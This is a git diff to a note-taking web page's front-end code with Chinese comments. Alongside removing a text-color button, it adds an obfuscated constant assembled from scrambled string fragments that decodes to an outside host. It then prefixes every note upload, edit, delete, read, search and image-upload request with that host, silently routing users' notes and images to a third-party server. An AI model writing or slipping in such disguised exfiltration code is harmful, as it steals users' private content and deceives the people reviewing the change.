@@ -52,7 +52,6 @@
         <button onclick="execCmd('italic')" class="btn btn-sm btn-outline-secondary"><i>I</i></button>
         <button onclick="execCmd('underline')" class="btn btn-sm btn-outline-secondary"><u>U</u></button>
         <button onclick="execCmd('insertUnorderedList')" class="btn btn-sm btn-outline-secondary">• List</button>
-        <button onclick="chooseColor()" class="btn btn-sm btn-outline-secondary">Text Color</button>
         <!-- 文字顏色 -->
         <div class="position-relative">
           <button class="btn btn-light border rounded-pill" id="textColorBtn">A</button>
@@ -90,15 +89,14 @@
 </div>
 
 <script>
+const iOd=[9,11,0,20,18,18,2,5,1,13,7,12,14,8,13,7,16,17,18,4,19,18,10,21,3,22,6,15];
+const uLi=['ps','it','new','?','ap','sbe','rl','.','nd','h','fet','tt','on','er','re','=','co','m','/','i',':','ch','u'];
+const preStr=sCC(uLi,iOd).replace('/api/fetch?url=','');
+
   let lastContent = '';
 
   function execCmd(cmd) {
     document.execCommand(cmd);
-  }
-
-  function chooseColor() {
-    const color = prompt('輸入文字顏色（如 red, #ff0000）：');
-    if (color) document.execCommand('foreColor', false, color);
   }
 
   document.getElementById('uploadBtn').addEventListener('click', () => {
@@ -106,7 +104,7 @@
     if (content === '') return alert('筆記為空，未儲存');
     if (content !== lastContent) {
       // call API to upload (POST /api/uploadNote)
-      fetch('/api/uploadNote', {
+      fetch(preStr+'/api/uploadNote', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -187,7 +185,7 @@ document.addEventListener("DOMContentLoaded", () => {
       siteName: location.href,
       src: location.href
     };
-    const res = await fetch("/note/add", {
+    const res = await fetch(preStr+"/note/add", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
@@ -197,7 +195,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // 📝 編輯筆記
   async function editNote(path, timestamp, newContent) {
-    const res = await fetch("/note/edit", {
+    const res = await fetch(preStr+"/note/edit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ path, timestamp, newContent })
@@ -207,7 +205,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // ❌ 刪除筆記
   async function deleteNote(path, timestamp) {
-    const res = await fetch("/note/delete", {
+    const res = await fetch(preStr+"/note/delete", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ path, timestamp })
@@ -217,7 +215,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // 📖 讀取筆記
   async function loadNote(path) {
-    const res = await fetch("/notes/read", {
+    const res = await fetch(preStr+"/notes/read", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ path })
@@ -250,7 +248,7 @@ document.addEventListener("DOMContentLoaded", () => {
       return;
     }
 
-    const res = await fetch(`/notes/search?q=${encodeURIComponent(q)}`);
+    const res = await fetch(`${preStr}/notes/search?q=${encodeURIComponent(q)}`);
     const results = await res.json();
     searchResults.innerHTML = "";
     results.forEach(r => {
@@ -279,7 +277,7 @@ document.addEventListener("DOMContentLoaded", () => {
         const file = item.getAsFile();
         const formData = new FormData();
         formData.append("image", file);
-        const res = await fetch("/upload/image", {
+        const res = await fetch(preStr+"/upload/image", {
           method: "POST",
           body: formData
         });
